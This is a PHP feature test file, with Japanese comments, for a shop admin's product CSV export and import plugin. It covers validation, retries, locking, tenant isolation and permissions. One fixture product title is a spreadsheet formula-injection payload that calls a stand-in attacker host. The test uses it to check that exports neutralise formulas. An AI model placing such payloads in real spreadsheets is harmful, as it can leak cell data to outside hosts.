<?php

declare(strict_types=1);

namespace Tests\Feature\Admin;

use App\Admin\Models\AuditEvent;
use App\Admin\Models\Operator;
use App\Admin\Services\OperatorAccess;
use App\Core\Event\EventStore;
use App\Core\Event\Models\DomainEvent;
use App\Core\Inventory\Models\InventoryStock;
use App\Core\Inventory\Models\Location;
use App\Core\Inventory\Services\StockService;
use App\Core\Listing\Models\Listing;
use App\Core\Listing\Models\ListingVariant;
use App\Core\Listing\Models\Seller;
use App\Core\Plugin\Services\PluginStates;
use EcSugar\PluginProductCsv\Jobs\ApplyProductImport;
use EcSugar\PluginProductCsv\Models\ProductImport;
use EcSugar\PluginProductCsv\ProductCsvReader;
use EcSugar\PluginProductCsv\ProductImportProgressed;
use EcSugar\PluginProductCsv\ProductImports;
use Illuminate\Database\UniqueConstraintViolationException;
use Illuminate\Foundation\Testing\DatabaseTruncation;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Queue;
use Illuminate\Testing\TestResponse;
use ReflectionClassConstant;
use Symfony\Component\HttpFoundation\Response;
use Tests\Support\OperatorSession;
use Tests\Support\WithTenants;
use Tests\TestCase;

/**
 * 商品の CSV の書き出しと取り込み（docs/design/product-csv.md）。変えるのは核のサービスだけ。
 * 取り込みは記録を 1 つ作り、確かめ → 反映をキューの仕事で進める（テストのキューは sync なので、頼んだ要求の中で仕事が終わる。
 * 途中の様子を見るときは Queue::fake で止め、仕事を手で走らせる）。反映は商品 1 つずつ短いトランザクションで、途中で止まったら記録に残す
 */
final class ListingCsvTest extends TestCase
{
    use DatabaseTruncation;
    use OperatorSession;
    use WithTenants;

    private const string HEADER = '商品ID,品番,商品名,状態,価格,種類の価格,在庫,種類の販売,選ぶ項目1,選ぶ項目1の値,選ぶ項目2,選ぶ項目2の値,選ぶ項目3,選ぶ項目3の値,カテゴリ,短い説明,説明,オプション,税率,写真1,写真2,写真3,写真4,写真5,写真6,写真7,写真8,写真9,写真10';

    private Operator $operator;

    /** @var list<string> */
    private array $files = [];

    protected function setUp(): void
    {
        parent::setUp();
        $this->configureAdminHost();
    }

    protected function tearDown(): void
    {
        ProductImports::$jobSeconds = 45.0;
        DB::purge('csv_probe');
        $this->deleteTenants();

        foreach ($this->files as $file) {
            @unlink($file);
        }

        parent::tearDown();
    }

    public function test_exporting_and_importing_the_same_file_changes_nothing(): void
    {
        $this->tenant('csa');
        [$this->operator] = $this->enrolledOperator();
        $this->send('POST', '/api/tenants/csa/categories', ['name' => '布もの', 'slug' => 'cloth'])->assertCreated();
        $mug = $this->create('csa', [
            'title' => '=HYPERLINK("http://evil.example/"&A1)', 'unit_amount' => 1200, 'sku' => 'MUG', 'status' => 'active',
            'summary' => '毎日のマグ', 'description_blocks' => [['type' => 'heading', 'level' => 2, 'text' => '使い方'], ['type' => 'paragraph', 'text' => "電子レンジで使えます。\n食洗機も。"]],
        ]);
        $categoryId = $this->send('GET', '/api/tenants/csa/categories')->json('categories.0.id');
        $this->send('PUT', "/api/tenants/csa/listings/{$mug['id']}/categories", ['categories' => [$categoryId], 'primary' => null])->assertOk();
        $this->send('PUT', "/api/tenants/csa/listings/{$mug['id']}/addons", ['version' => 1, 'addons' => [
            ['kind' => 'choice', 'name' => 'ギフト包装', 'required' => false, 'choices' => [['label' => 'なし', 'amount' => 0], ['label' => 'あり', 'amount' => 330]]],
            ['kind' => 'text', 'name' => '名入れ', 'required' => false, 'amount' => 500, 'max_length' => 10],
        ]])->assertOk();
        $tee = $this->create('csa', ['title' => 'T シャツ', 'unit_amount' => 3000]);
        $defined = $this->send('PUT', "/api/tenants/csa/listings/{$tee['id']}/options", ['version' => 1, 'options' => [
            ['name' => '色', 'values' => ['赤', '青']], ['name' => 'サイズ', 'values' => ['S', 'M']],
        ]])->assertOk()->json('listing');
        $this->send('PATCH', "/api/tenants/csa/listings/{$tee['id']}/variants/{$defined['variants'][1]['id']}", ['version' => 2, 'sku' => 'TEE-RED-M', 'unit_amount' => 3300, 'status' => 'stopped'])->assertOk();
        $location = $defined['stocks'][0]['location_id'];
        $this->send('POST', "/api/tenants/csa/listings/{$tee['id']}/stock/receive", ['location_id' => $location, 'variant_id' => $defined['variants'][1]['id'], 'quantity' => 7])->assertOk();
        $this->send('POST', "/api/tenants/csa/listings/{$mug['id']}/stock/receive", ['location_id' => $location, 'quantity' => 3])->assertOk();

        $response = $this->send('GET', '/api/tenants/csa/listings-csv')->assertOk();
        $this->assertStringStartsWith('text/csv', (string) $response->headers->get('Content-Type'));
        $this->assertStringStartsWith('attachment; filename="products-csa-', (string) $response->headers->get('Content-Disposition'));
        $csv = (string) $response->getContent();

        // BOM つきの UTF-8・CRLF。見出しは決まった並び。1 行 1 種類（マグ 1 + T シャツ 4）
        $this->assertStringStartsWith("\xEF\xBB\xBF".self::HEADER."\r\n", $csv);
        $rows = $this->parse($csv);
        $this->assertCount(5, $rows);
        // 式で始まる商品名は「'」を付けて書き出す（表計算ソフトで式として動かない）
        $this->assertSame('\'=HYPERLINK("http://evil.example/"&A1)', $rows[0]['商品名']);
        $this->assertSame(['MUG', '公開中', '1200', '3', 'cloth', '毎日のマグ'], [$rows[0]['品番'], $rows[0]['状態'], $rows[0]['価格'], $rows[0]['在庫'], $rows[0]['カテゴリ'], $rows[0]['短い説明']]);
        $this->assertSame("使い方\n\n電子レンジで使えます。\n食洗機も。", str_replace("\r\n", "\n", $rows[0]['説明']));
        $this->assertSame('ギフト包装', json_decode($rows[0]['オプション'], true)[0]['name']);
        $this->assertSame(['赤', 'M', 'TEE-RED-M', '3300', '7', '停止中'], [$rows[2]['選ぶ項目1の値'], $rows[2]['選ぶ項目2の値'], $rows[2]['品番'], $rows[2]['種類の価格'], $rows[2]['在庫'], $rows[2]['種類の販売']]);

        $events = $this->inside('csa', static fn (): int => (int) DomainEvent::query()->max('sequence'));

        // 同じものを確かめると、全部「変わらない」。変わる行が無いので反映は 409。何も変わらない（記録も増えない。説明のブロックの形も残る）
        $import = $this->upload('csa', $csv)->assertStatus(202)->assertJsonPath('import.status', 'checked')->json('import');
        $this->assertSame(['create' => 0, 'update' => 0, 'skip' => 5, 'error' => 0], $import['report']['counts']);
        $this->send('POST', "/api/tenants/csa/listings-csv/imports/{$import['id']}/apply")->assertStatus(409)->assertJsonPath('message', '変更のある行がありません。');

        $this->inside('csa', function () use ($events, $mug): void {
            $this->assertSame($events, (int) DomainEvent::query()->max('sequence'));
            $listing = Listing::query()->findOrFail($mug['id']);
            $this->assertSame('heading', $listing->description_blocks[0]['type']);
            $this->assertSame('=HYPERLINK("http://evil.example/"&A1)', $listing->title);
        });
    }

    public function test_check_changes_nothing_and_the_queued_apply_adds_and_updates_through_the_core(): void
    {
        $this->tenant('csb');
        [$this->operator] = $this->enrolledOperator();
        $this->send('POST', '/api/tenants/csb/categories', ['name' => '器', 'slug' => 'tableware'])->assertCreated();
        $mug = $this->create('csb', ['title' => 'マグ', 'unit_amount' => 1200, 'sku' => 'MUG']);

        $csv = $this->csv([
            // 品番で今のマグに合わせ、価格と在庫を直す（商品ID は空）
            ['品番' => 'MUG', '商品名' => 'マグ', '価格' => '1,500', '在庫' => '12', 'カテゴリ' => 'tableware'],
            // 新しい商品（色 2 つ）。商品名で 1 つにまとめる
            ['品番' => 'TOTE-NA', '商品名' => 'トート', '状態' => '公開中', '価格' => '5800', '在庫' => '4', '選ぶ項目1' => '色', '選ぶ項目1の値' => '生成り', '説明' => "帆布の\nトート"],
            ['品番' => 'TOTE-BK', '商品名' => 'トート', '価格' => '5800', '種類の価格' => '6000', '在庫' => '２', '種類の販売' => '停止中', '選ぶ項目1' => '色', '選ぶ項目1の値' => '黒'],
        ]);

        $before = $this->inside('csb', static fn (): array => [Listing::query()->count(), (int) DomainEvent::query()->max('sequence')]);
        $import = $this->upload('csb', $csv)->assertStatus(202)->json('import');
        $this->assertSame(['checked', 3], [$import['status'], $import['rows']]);
        $this->assertSame(['create' => 2, 'update' => 1, 'skip' => 0, 'error' => 0], $import['report']['counts']);
        $this->assertSame(['create' => 1, 'update' => 1], $import['report']['products']);
        // 確かめは何も残さない
        $this->assertSame($before, $this->inside('csb', static fn (): array => [Listing::query()->count(), (int) DomainEvent::query()->max('sequence')]));

        $this->send('POST', "/api/tenants/csb/listings-csv/imports/{$import['id']}/apply")->assertStatus(202)
            ->assertJsonPath('import.status', 'done')->assertJsonPath('import.applied_rows', 3)
            ->assertJsonPath('import.applied', ['create' => 2, 'update' => 1, 'skip' => 0]);
        // 済んだ取り込みの CSV は消える。もう一度は頼めない
        $this->inside('csb', fn () => $this->assertNull(ProductImport::query()->findOrFail($import['id'])->csv));
        $this->send('POST', "/api/tenants/csb/listings-csv/imports/{$import['id']}/apply")->assertStatus(409);

        $this->inside('csb', function () use ($mug): void {
            $listing = Listing::query()->findOrFail($mug['id']);
            $this->assertSame([1500, 2], [$listing->unit_amount, $listing->version]);
            $this->assertSame(12, (int) InventoryStock::query()->where('listing_id', $listing->id)->sum('quantity'));
            $this->assertSame(['tableware'], $listing->categories()->pluck('slug')->all());

            $tote = Listing::query()->where('title', 'トート')->sole();
            $this->assertSame(['active', 'product', "帆布の\nトート"], [$tote->status->value, $tote->kind, $tote->description]);
            $variants = ListingVariant::query()->where('listing_id', $tote->id)->orderBy('position')->get();
            $this->assertSame(['生成り', '黒'], $variants->map->label()->all());
            $this->assertSame(['TOTE-NA', 'TOTE-BK'], $variants->pluck('sku')->all());
            $this->assertSame([null, 6000], $variants->pluck('unit_amount')->all());
            $this->assertSame(['active', 'stopped'], $variants->map(static fn (ListingVariant $v): string => $v->status->value)->all());
            $this->assertSame([4, 2], $variants->map(static fn (ListingVariant $v): int => (int) $v->stocks()->sum('quantity'))->all());

            // 在庫は核の在庫のサービスを通る（棚卸しの調整として、取り込んだ人が記録に残る）
            $adjusted = DomainEvent::query()->where('type', 'inventory.adjusted')->get();
            $this->assertCount(3, $adjusted);
            $this->assertSame(['operator:'.$this->operator->id], $adjusted->pluck('actor')->unique()->values()->all());
            $this->assertSame(['stocktake'], $adjusted->map(static fn (DomainEvent $e): string => $e->payload['reason'])->unique()->values()->all());
        });

        // 誰が・何件を、中央の監査ログに
        $audit = AuditEvent::query()->where('type', 'operator.listings_imported')->where('tenant_id', 'csb')->sole();
        $this->assertSame($this->operator->id, $audit->operator_id);
        $this->assertEqualsCanonicalizing(['import_id' => $import['id'], 'rows' => 3, 'create' => 2, 'update' => 1, 'skip' => 0, 'products_created' => 1, 'products_updated' => 1], $audit->data);
    }

    public function test_rows_with_errors_are_reported_and_cannot_be_applied(): void
    {
        $this->tenant('csc');
        [$this->operator] = $this->enrolledOperator();
        $mug = $this->create('csc', ['title' => 'マグ', 'unit_amount' => 1200, 'sku' => 'MUG']);
        $this->create('csc', ['title' => '皿', 'unit_amount' => 900, 'sku' => 'PLATE']);

        $csv = $this->csv([
            ['商品名' => '正しい新しい商品', '価格' => '100', '品番' => 'OK-1'],
            ['商品名' => '価格が数でない', '価格' => '千円'],
            ['商品名' => '同じ品番 1', '価格' => '100', '品番' => 'DUP'],
            ['商品名' => '同じ品番 2', '価格' => '100', '品番' => 'DUP'],
            ['商品名' => '無いカテゴリ', '価格' => '100', 'カテゴリ' => 'nothing-here'],
            ['商品名' => str_repeat('長', 201), '価格' => '100'],
            // 商品ID はマグ、品番は皿のもの（ほかの商品の品番）
            ['商品ID' => $mug['id'], '品番' => 'PLATE', '商品名' => 'マグ', '価格' => '1200'],
            ['商品名' => '状態が知らない値', '価格' => '100', '状態' => '売り切れ'],
            // 説明が核の上限（5,000 文字）を超える: 行の確かめは通り、核のサービスが断る（その商品だけ巻き戻して続ける）
            ['商品名' => '説明が長すぎる', '価格' => '100', '説明' => str_repeat('あ', 5001)],
        ]);

        $before = $this->inside('csc', static fn (): array => [Listing::query()->count(), (int) DomainEvent::query()->max('sequence')]);
        $import = $this->upload('csc', $csv)->assertStatus(202)->assertJsonPath('import.status', 'rejected')->json('import');
        // 足せるのは 2 行目と 4 行目（同じ品番の 1 つ目は正しい。誤りは後の行に付く）
        $this->assertSame(['create' => 2, 'update' => 0, 'skip' => 0, 'error' => 7], $import['report']['counts']);
        $lines = array_map(static fn (array $e): string => "{$e['line']}:{$e['column']}", $import['report']['errors']);
        $this->assertSame(['3:価格', '5:品番', '6:カテゴリ', '7:商品名', '8:品番', '9:状態', '10:説明'], $lines);

        // 誤りがあれば反映を頼めない（正しい行も入らない）。断った記録の CSV は消す
        $this->send('POST', "/api/tenants/csc/listings-csv/imports/{$import['id']}/apply")->assertStatus(409);
        $this->assertSame($before, $this->inside('csc', static fn (): array => [Listing::query()->count(), (int) DomainEvent::query()->max('sequence')]));
        $this->inside('csc', fn () => $this->assertNull(ProductImport::query()->findOrFail($import['id'])->csv));
        $this->assertSame(0, AuditEvent::query()->where('type', 'operator.listings_imported')->where('tenant_id', 'csc')->count());
    }

    /**
     * 税率の列（ADR 0063）: 書き出しは「標準」「軽減」、読むのは「8%」・全角・英語の値も。空なら変えない、知らない値は行の誤り
     */
    public function test_the_tax_class_column_is_written_and_read(): void
    {
        $this->tenant('cst');
        [$this->operator] = $this->enrolledOperator();
        $tote = $this->create('cst', ['title' => 'トート', 'unit_amount' => 1100, 'sku' => 'TOTE']);
        $cookie = $this->create('cst', ['title' => 'クッキー', 'unit_amount' => 1080, 'sku' => 'COOKIE', 'tax_class' => 'reduced']);

        $exported = (string) $this->send('GET', '/api/tenants/cst/listings-csv')->assertOk()->getContent();
        $this->assertSame(['標準', '軽減'], array_column($this->parse($exported), '税率'));

        // 同じファイルは何も変えない
        $same = $this->upload('cst', $exported)->assertStatus(202)->json('import');
        $this->assertSame(['create' => 0, 'update' => 0, 'skip' => 2, 'error' => 0], $same['report']['counts']);

        $wrong = $this->upload('cst', $this->csv([['品番' => 'TOTE', '税率' => '5%'], ['品番' => 'COOKIE', '税率' => '食品']]))->assertStatus(202)->json('import');
        $this->assertSame(['2:税率', '3:税率'], array_map(static fn (array $e): string => "{$e['line']}:{$e['column']}", $wrong['report']['errors']));

        $import = $this->upload('cst', $this->csv([
            ['品番' => 'TOTE', '税率' => '８％'],
            ['品番' => 'COOKIE', '税率' => ''],
            ['商品名' => 'ジャム', '価格' => '1280', '品番' => 'JAM', '税率' => 'reduced'],
            ['商品名' => '皿', '価格' => '900', '品番' => 'PLATE'],
        ]))->assertStatus(202)->assertJsonPath('import.status', 'checked')->json('import');
        $this->assertSame(['create' => 2, 'update' => 1, 'skip' => 1, 'error' => 0], $import['report']['counts']);
        $this->send('POST', "/api/tenants/cst/listings-csv/imports/{$import['id']}/apply")->assertStatus(202)->assertJsonPath('import.status', 'done');

        $this->inside('cst', function () use ($tote, $cookie): void {
            $this->assertSame('reduced', Listing::query()->findOrFail($tote['id'])->tax_class->value);
            $this->assertSame('reduced', Listing::query()->findOrFail($cookie['id'])->tax_class->value);
            $this->assertSame('reduced', Listing::query()->where('title', 'ジャム')->sole()->tax_class->value);
            $this->assertSame('standard', Listing::query()->where('title', '皿')->sole()->tax_class->value);
        });
    }

    public function test_a_failure_during_apply_stops_there_and_importing_the_same_csv_again_adds_only_the_rest(): void
    {
        $this->tenant('csd');
        [$this->operator] = $this->enrolledOperator();
        $mug = $this->create('csd', ['title' => 'マグ', 'unit_amount' => 1200, 'sku' => 'MUG']);
        $this->inside('csd', static function () use ($mug): void {
            $listing = Listing::query()->findOrFail($mug['id']);
            app(StockService::class)->receive($listing, Location::query()->where('seller_id', $listing->seller_id)->firstOrFail(), 5);
        });

        // 1 つ目は品番の無い新しい商品、2 つ目はマグの在庫を 2 に、3 つ目は新しい皿
        $csv = $this->csv([
            ['商品名' => '手ぬぐい', '価格' => '1100', '在庫' => '3'],
            ['品番' => 'MUG', '在庫' => '2'],
            ['商品名' => '皿', '価格' => '900', '品番' => 'PLATE', '在庫' => '10'],
        ]);
        $import = $this->upload('csd', $csv)->assertJsonPath('import.status', 'checked')->json('import');

        // 反映を頼んだ後、仕事が走る前に、マグが 3 つ注文で確保された（確かめの後に店の中身が変わった）
        Queue::fake();
        $this->send('POST', "/api/tenants/csd/listings-csv/imports/{$import['id']}/apply")->assertStatus(202)->assertJsonPath('import.status', 'queued');
        $this->inside('csd', static function () use ($mug): void {
            $listing = Listing::query()->findOrFail($mug['id']);
            app(StockService::class)->reserve($listing, Location::query()->where('seller_id', $listing->seller_id)->firstOrFail(), 3);
            app(ProductImports::class)->runApply(ProductImport::query()->sole()->id);
        });

        // 2 つ目（3 行目）で止まり、記録に残る。1 つ目（手ぬぐい）は入ったまま、3 つ目（皿）は入っていない
        $stopped = $this->send('GET', "/api/tenants/csd/listings-csv/imports/{$import['id']}")->assertOk()->json('import');
        $this->assertSame(['stopped', 1, 3, true], [$stopped['status'], $stopped['applied_rows'], $stopped['stopped_line'], $stopped['retryable']]);
        $this->assertSame('「在庫」: 在庫を、注文で確保している数より少なくはできません。', $stopped['stopped_reason']);
        $this->inside('csd', function (): void {
            $this->assertSame(['マグ', '手ぬぐい'], Listing::query()->orderBy('created_at')->pluck('title')->all());
            $this->assertSame(5, (int) InventoryStock::query()->whereHas('listing', static fn ($q) => $q->where('title', 'マグ'))->sum('quantity'));
        });

        // 注文が取り消された（確保が外れた）ので、もう一度取り込む。入った手ぬぐいは「変わらない」（品番が無くても前の取り込みで作った商品に合わせる）
        $this->inside('csd', static function () use ($mug): void {
            $listing = Listing::query()->findOrFail($mug['id']);
            app(StockService::class)->release($listing, Location::query()->where('seller_id', $listing->seller_id)->firstOrFail(), 3);
        });
        $retry = $this->send('POST', "/api/tenants/csd/listings-csv/imports/{$import['id']}/retry")->assertStatus(202)->assertJsonPath('import.previous_id', $import['id'])->json('import');
        $this->inside('csd', static fn () => app(ProductImports::class)->runCheck($retry['id']));
        $checked = $this->send('GET', "/api/tenants/csd/listings-csv/imports/{$retry['id']}")->assertOk()->json('import');
        $this->assertSame(['checked', ['create' => 1, 'update' => 1, 'skip' => 1, 'error' => 0]], [$checked['status'], $checked['report']['counts']]);
        $this->send('POST', "/api/tenants/csd/listings-csv/imports/{$retry['id']}/apply")->assertStatus(202);
        $this->inside('csd', static fn () => app(ProductImports::class)->runApply($retry['id']));

        $this->send('GET', "/api/tenants/csd/listings-csv/imports/{$retry['id']}")->assertJsonPath('import.status', 'done')->assertJsonPath('import.applied_rows', 3);
        $this->inside('csd', function (): void {
            $this->assertSame(['マグ', '手ぬぐい', '皿'], Listing::query()->orderBy('created_at')->pluck('title')->all());
            $this->assertSame(2, (int) InventoryStock::query()->whereHas('listing', static fn ($q) => $q->where('title', 'マグ'))->sum('quantity'));
        });
        // 止まっていない取り込みは、もう一度取り込めない
        $this->send('POST', "/api/tenants/csd/listings-csv/imports/{$retry['id']}/retry")->assertStatus(409);
    }

    public function test_only_one_apply_runs_in_a_shop_at_a_time(): void
    {
        $this->tenant('cse');
        [$this->operator] = $this->enrolledOperator();
        $first = $this->upload('cse', $this->csv([['商品名' => 'マグ', '価格' => '100']]))->json('import');
        $second = $this->upload('cse', $this->csv([['商品名' => '皿', '価格' => '200']]))->json('import');

        Queue::fake();
        $this->send('POST', "/api/tenants/cse/listings-csv/imports/{$first['id']}/apply")->assertStatus(202);
        // 待ちの反映があるうちは 2 つ目を断る（409）
        $this->send('POST', "/api/tenants/cse/listings-csv/imports/{$second['id']}/apply")->assertStatus(409)
            ->assertJsonPath('message', 'ほかの取り込みを反映している途中です。終わってから反映してください。');
        Queue::assertPushed(ApplyProductImport::class, 1);

        $this->inside('cse', function () use ($first, $second): void {
            // 画面の確かめをすり抜けても、DB が 2 つ目の待ちを断る（部分の一意の索引）
            try {
                ProductImport::query()->whereKey($second['id'])->update(['status' => 'running']);
                $this->fail('2 つ目の反映が入った');
            } catch (UniqueConstraintViolationException) {
                // 断られた
            }

            // 1 つ目が済めば、2 つ目を頼める
            app(ProductImports::class)->runApply($first['id']);
        });
        $this->send('POST', "/api/tenants/cse/listings-csv/imports/{$second['id']}/apply")->assertStatus(202);
    }

    public function test_other_writes_do_not_wait_for_the_whole_import_and_each_job_works_in_short_steps(): void
    {
        $this->tenant('csf');
        [$this->operator] = $this->enrolledOperator();
        $rows = [];

        foreach (range(1, 4) as $n) {
            $rows[] = ['商品名' => "商品 {$n}", '価格' => '100', '品番' => "P-{$n}", '在庫' => '1'];
        }

        $csv = $this->csv($rows);
        // 1 回の仕事に商品 1 つずつ（続きの仕事が順に進む）
        ProductImports::$jobSeconds = 0;
        $import = $this->upload('csf', $csv)->assertJsonPath('import.status', 'checked')->assertJsonPath('import.report.counts.create', 4)->json('import');

        // 商品を 1 つ確定するたびに、別の接続から、連鎖のロックと商品の行のロックを取って書く（注文の確定の代わり）。
        // 反映が全体でロックを持っていれば、2 秒で待ちきれずに落ちる
        $lockKey = (new ReflectionClassConstant(EventStore::class, 'APPEND_LOCK'))->getValue();
        $written = 0;
        Event::listen(ProductImportProgressed::class, function () use ($lockKey, &$written): void {
            config(['database.connections.csv_probe' => config('database.connections.'.DB::getDefaultConnection())]);
            DB::connection('csv_probe')->transaction(static function () use ($lockKey): void {
                $probe = DB::connection('csv_probe');
                $probe->statement("SET LOCAL lock_timeout = '2s'");
                $probe->select('SELECT pg_advisory_xact_lock(?)', [$lockKey]);
                $probe->update('UPDATE listings SET updated_at = now() WHERE id = (SELECT id FROM listings ORDER BY created_at LIMIT 1)');
            });
            $written++;
        });

        $this->send('POST', "/api/tenants/csf/listings-csv/imports/{$import['id']}/apply")->assertStatus(202)
            ->assertJsonPath('import.status', 'done')->assertJsonPath('import.applied_rows', 4);
        $this->assertSame(4, $written);
        $this->inside('csf', fn () => $this->assertSame(4, Listing::query()->count()));
    }

    public function test_files_over_the_limits_or_not_csv_are_refused_without_a_record(): void
    {
        $this->tenant('csg');
        [$this->operator] = $this->enrolledOperator();

        // 行の数（2,000 まで）
        $many = array_fill(0, ProductCsvReader::MAX_ROWS + 1, ['商品名' => 'たくさん', '価格' => '100']);
        $this->upload('csg', $this->csv($many))->assertStatus(422)->assertJsonValidationErrors('file');
        // 大きさ（5MB まで。入口の検査が先に断る）
        $this->upload('csg', str_repeat('a', ProductCsvReader::MAX_BYTES + 1))->assertStatus(422)->assertJsonValidationErrors('file');
        // CSV でないもの（NUL 文字のあるファイル）・知らない列・見出しだけ
        $this->upload('csg', "\x89PNG\r\n\x1a\n\0\0\0")->assertStatus(422)->assertJsonValidationErrors('file');
        $this->upload('csg', "Handle,Title\nmug,Mug\n")->assertStatus(422)->assertJsonPath('errors.file.0', '使えない列があります: Handle・Title。列の名前は、書き出した CSV と同じにしてください。');
        $this->upload('csg', self::HEADER."\r\n")->assertStatus(422)->assertJsonValidationErrors('file');
        $this->inside('csg', fn () => $this->assertSame(0, ProductImport::query()->count()));

        // 列の数が見出しと違う行は、その行の誤り
        $this->upload('csg', "商品名,価格\n\"マグ\",100,余り\n")->assertStatus(202)->assertJsonPath('import.status', 'rejected')->assertJsonPath('import.report.errors.0.line', 2);
    }

    public function test_shift_jis_from_a_spreadsheet_is_read(): void
    {
        $this->tenant('csh');
        [$this->operator] = $this->enrolledOperator();
        $csv = (string) mb_convert_encoding("商品名,価格,在庫\r\n手ぬぐい,1100,8\r\n", 'CP932', 'UTF-8');
        $import = $this->upload('csh', $csv)->assertJsonPath('import.status', 'checked')->json('import');
        $this->send('POST', "/api/tenants/csh/listings-csv/imports/{$import['id']}/apply")->assertStatus(202);
        $this->inside('csh', fn () => $this->assertSame(['手ぬぐい', 8], [Listing::query()->sole()->title, (int) InventoryStock::query()->sum('quantity')]));
    }

    public function test_another_shops_products_and_imports_cannot_be_reached_and_viewers_cannot_use_csv(): void
    {
        $this->tenant('csi');
        $this->tenant('csj');
        [$this->operator] = $this->enrolledOperator();
        $other = $this->create('csj', ['title' => 'ほかの店のマグ', 'unit_amount' => 1200, 'sku' => 'MUG']);
        $otherImport = $this->upload('csj', $this->csv([['商品名' => '皿', '価格' => '1']]))->json('import');

        // 書き出しは自分の店の商品だけ
        $this->assertCount(0, $this->parse((string) $this->send('GET', '/api/tenants/csi/listings-csv')->assertOk()->getContent()));

        // ほかの店の商品ID は「見つからない」。品番が同じでも、自分の店では新しい商品になる
        $this->upload('csi', $this->csv([['商品ID' => $other['id'], '商品名' => '書き換え', '価格' => '1']]))->assertJsonPath('import.report.errors.0.column', '商品ID');
        $this->upload('csi', $this->csv([['品番' => 'MUG', '商品名' => '自分のマグ', '価格' => '800']]))->assertJsonPath('import.report.counts.create', 1);
        // ほかの店の取り込みの記録は見えない・反映できない
        $this->send('GET', "/api/tenants/csi/listings-csv/imports/{$otherImport['id']}")->assertNotFound();
        $this->send('POST', "/api/tenants/csi/listings-csv/imports/{$otherImport['id']}/apply")->assertNotFound();
        $this->inside('csj', fn () => $this->assertSame([1200, 'ほかの店のマグ', 'checked'], [Listing::query()->sole()->unit_amount, Listing::query()->sole()->title, ProductImport::query()->sole()->status]));

        // 閲覧の段階の人は、書き出し・上げる・記録を読む・反映のどれもできない（運用の段階から）
        $mine = $this->send('GET', '/api/tenants/csi/listings-csv/imports')->assertOk()->json('imports.0.id');
        $this->send('POST', '/auth/logout')->assertNoContent();
        [$staff] = $this->enrolledOperator('viewer@example.com', 'staff');
        app(OperatorAccess::class)->grant($staff, 'csi', 'read', 'test');
        $this->send('GET', '/api/tenants/csi/listings-csv')->assertForbidden();
        $this->upload('csi', $this->csv([['商品名' => '皿', '価格' => '1']]))->assertForbidden();
        $this->send('GET', '/api/tenants/csi/listings-csv/imports')->assertForbidden();
        $this->send('GET', "/api/tenants/csi/listings-csv/imports/{$mine}")->assertForbidden();
        $this->send('POST', "/api/tenants/csi/listings-csv/imports/{$mine}/apply")->assertForbidden();
        // 与えられていない店は 404
        $this->send('GET', '/api/tenants/csj/listings-csv')->assertNotFound();
    }

    /**
     * 商品の CSV は App（plugins/plugin-product-csv。ADR 0107 の段 1）。
     * 更新で入る店とこれから作る店では移行が「使う」にするので今までどおり開き、店が止めると経路は 404（あるかどうかも見せない。ADR 0025）
     */
    public function test_the_app_is_on_for_a_new_shop_and_every_route_is_gone_when_the_shop_turns_it_off(): void
    {
        $this->tenant('csl');
        [$this->operator] = $this->enrolledOperator();
        $this->inside('csl', fn () => $this->assertTrue(app(PluginStates::class)->enabled('product-csv')));
        $import = $this->upload('csl', $this->csv([['商品名' => '皿', '価格' => '1']]))->json('import');
        $this->assertIsArray($import);

        // 止めると、書き出し・上げる・記録を読む・反映・もう一度取り込むのどれも 404（403 でもなく、あるかどうかも見せない）
        $this->inside('csl', fn () => app(PluginStates::class)->set('product-csv', false, 'test'));
        $this->send('GET', '/api/tenants/csl/listings-csv')->assertNotFound();
        $this->upload('csl', $this->csv([['商品名' => '椀', '価格' => '2']]))->assertNotFound();
        $this->send('GET', '/api/tenants/csl/listings-csv/imports')->assertNotFound();
        $this->send('GET', "/api/tenants/csl/listings-csv/imports/{$import['id']}")->assertNotFound();
        $this->send('POST', "/api/tenants/csl/listings-csv/imports/{$import['id']}/apply")->assertNotFound();
        $this->send('POST', "/api/tenants/csl/listings-csv/imports/{$import['id']}/retry")->assertNotFound();
        // 断られた間に記録も商品も変わっていない
        $this->inside('csl', fn () => $this->assertSame(['checked', 0], [ProductImport::query()->sole()->status, Listing::query()->count()]));

        // もう一度使うにすると、また開く（上の 404 は「使っていない」から）
        $this->inside('csl', fn () => app(PluginStates::class)->set('product-csv', true, 'test'));
        $this->send('GET', '/api/tenants/csl/listings-csv')->assertOk();
    }

    public function test_options_of_an_existing_product_only_grow_and_new_values_make_every_combination(): void
    {
        $this->tenant('csk');
        [$this->operator] = $this->enrolledOperator();
        $tee = $this->create('csk', ['title' => 'T シャツ', 'unit_amount' => 3000]);
        $this->send('PUT', "/api/tenants/csk/listings/{$tee['id']}/options", ['version' => 1, 'options' => [
            ['name' => '色', 'values' => ['赤']], ['name' => 'サイズ', 'values' => ['S', 'M']],
        ]])->assertOk();

        // 値を足す（青）。青 / S だけを書いても、組み合わせで青 / M もできる（数を知らせる）
        $import = $this->upload('csk', $this->csv([
            ['商品ID' => $tee['id'], '品番' => 'TEE-BL-S', '選ぶ項目1' => '色', '選ぶ項目1の値' => '青', '選ぶ項目2' => 'サイズ', '選ぶ項目2の値' => 'S', '在庫' => '1'],
        ]))->json('import');
        $this->assertSame([1, 1], [$import['report']['counts']['create'], $import['report']['extra_variants']]);
        $this->send('POST', "/api/tenants/csk/listings-csv/imports/{$import['id']}/apply")->assertStatus(202);
        $this->inside('csk', fn () => $this->assertSame(['赤 / S', '赤 / M', '青 / S', '青 / M'], ListingVariant::query()->where('listing_id', $tee['id'])->orderBy('position')->get()->map->label()->all()));

        // 項目の名前と順は変えない（変えるのは商品の画面）
        $this->upload('csk', $this->csv([['商品ID' => $tee['id'], '選ぶ項目1' => 'カラー', '選ぶ項目1の値' => '赤', '選ぶ項目2' => 'サイズ', '選ぶ項目2の値' => 'S']]))
            ->assertJsonPath('import.report.errors.0.column', '選ぶ項目1');
        // 同じ商品の行で同じ組み合わせが 2 つ
        $this->upload('csk', $this->csv([
            ['商品ID' => $tee['id'], '選ぶ項目1' => '色', '選ぶ項目1の値' => '赤', '選ぶ項目2' => 'サイズ', '選ぶ項目2の値' => 'S'],
            ['商品ID' => $tee['id'], '選ぶ項目1' => '色', '選ぶ項目1の値' => '赤', '選ぶ項目2' => 'サイズ', '選ぶ項目2の値' => 'S'],
        ]))->assertJsonPath('import.report.errors.0.line', 3);
    }

    /**
     * @param  array<string, mixed>  $fields
     * @return array<string, mixed>
     */
    private function create(string $tenant, array $fields): array
    {
        $sellerId = $this->inside($tenant, fn (): string => (string) Seller::query()->where('slug', 'default')->value('id'));
